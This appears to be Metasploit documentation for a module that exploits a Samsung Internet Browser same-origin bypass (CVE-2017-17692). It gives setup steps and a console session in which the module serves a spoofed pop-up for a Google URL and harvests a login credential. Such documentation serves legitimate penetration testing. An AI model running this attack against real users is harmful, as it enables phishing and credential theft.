## Description
This module takes advantage of a Same-Origin Policy (SOP) bypass vulnerability in the Samsung Internet Browser (CVE-2017-17692), a popular mobile browser shipping with Samsung Android devices. By default, it initiates a redirect to a child tab, and rewrites the innerHTML to gather credentials via a fake pop-up and the gather credentials is stored in `creds`

## Vulnerable Application
This Module was tested on Samsung Internet Browser 5.4.02.3 during development.

## Verification Steps
1. Start `msfconsole -q`
2. `use auxiliary/gather/samsung_browser_sop_bypass`
3. `set SRVHOST`
4. `set SRVPORT`
5. `set URIPATH`
6. `set TARGET_URL`
5. `run`

## Scenarios
```
$ sudo msfconsole -q
msf > use auxiliary/gather/samsung_browser_sop_bypass
msf auxiliary(samsung_browser_sop_bypass) > set SRVHOST 192.168.1.104
SRVHOST => 192.168.1.104
msf auxiliary(samsung_browser_sop_bypass) > set SRVPORT 9090
SRVPORT => 9090
msf auxiliary(samsung_browser_sop_bypass) > set URIPATH /
URIPATH => /
msf auxiliary(samsung_browser_sop_bypass) > set TARGET_URL https://www.google.com/csi
TARGET_URL => https://www.google.com/csi
msf auxiliary(samsung_browser_sop_bypass) > run
[*] Auxiliary module execution completed
msf auxiliary(samsung_browser_sop_bypass) >
[*] Using URL: http://192.168.1.104:9090/
[*] Server started.
[*] 192.168.1.101: Request 'GET /'
[*] 192.168.1.101: Attempting to spoof origin for https://www.google.com/csi
[*] 192.168.1.101: Request 'GET /favicon.ico'
[*] 192.168.1.101: Attempting to spoof origin for https://www.google.com/csi
[*] 192.168.1.101: Request 'GET /favicon.ico'
[*] 192.168.1.101: Attempting to spoof origin for https://www.google.com/csi
[+] 192.168.1.101: Collected credential for 'https://www.google.com/csi' emailID:MyStrongPassword

msf auxiliary(samsung_browser_sop_bypass) > creds
Credentials
===========

host            origin          service          public          private                                                            realm                       private_type
----            ------          -------          ------          -------                                                            -----                       ------------
                                                 emailID         MyStrongPassword                                                   https://www.google.com/csi  Password

msf auxiliary(samsung_browser_sop_bypass) >
```

## Demos

Working of MSF Module: `https://youtu.be/ulU98cWVhoI`

Vulnerable Browser: `https://youtu.be/lpkbogxJXnw`
